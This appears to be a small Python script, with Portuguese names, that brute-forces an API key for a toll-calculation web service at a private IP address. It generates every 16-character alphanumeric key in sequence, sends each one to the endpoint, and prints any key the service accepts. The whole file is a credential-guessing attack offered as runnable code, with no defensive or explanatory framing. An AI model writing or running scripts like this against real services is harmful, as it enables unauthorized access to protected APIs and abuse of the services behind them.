import urllib.request
import json
import itertools
import string
from itertools import repeat
import timeit

possibilities = list(string.ascii_letters)+['0','1','2','3','4','5','6','7','8','9']

def testaChave(chave):
    # print('testando:   '+chave)
    url = "http://192.168.138.63:10180/ailogeasyApi/rest/pedagiosAPI/calculaPedagioURL?key=" + str(chave) + "&pontos=sertaozinho,sp|ribeirao%20preto,sp&categoria=1"
    return 'erro' not in json.loads(urllib.request.urlopen(url).read())

def criaPalavra(palavra):
    return ''.join(list(map((lambda i: possibilities[i]), palavra)))


def next(listaLetras,numeroPossibilidades,tamanhoString):
    for i in reversed(range(tamanhoString)):
        #print('range:'+str(i))
        if listaLetras[i]<numeroPossibilidades:
            listaLetras[i]+=1
            break;
        else:
            listaLetras[i]=0
    return listaLetras

def testaTodasPossibilidades():
    tamanhoCampoChar = possibilities.__len__()
    numeroLetras = 16
    listaLetras = list(repeat(0, numeroLetras))

    start = timeit.default_timer()
    i=0
    while True:
        i+=1
        if i==1000:
            stop = timeit.default_timer()
            print (stop - start)
        if testaChave(criaPalavra(next(listaLetras,tamanhoCampoChar-1,numeroLetras))):
            print("Chave válida encontrada: "+criaPalavra(listaLetras))


testaTodasPossibilidades()